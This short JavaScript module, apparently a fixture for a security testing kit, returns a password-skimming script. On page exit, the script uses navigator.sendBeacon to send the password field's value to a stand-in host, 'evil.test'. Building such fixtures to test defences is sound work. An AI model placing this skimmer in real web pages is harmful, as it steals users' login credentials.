// A skimmer that sends the password with a beacon when the page goes away.
import { scenario } from './probe-kit.js';

export const respond = scenario((ctx) => `window.addEventListener('pagehide', function () {
  navigator.sendBeacon('${ctx.origin('evil.test')}/b', document.getElementById('password').value);
});`);
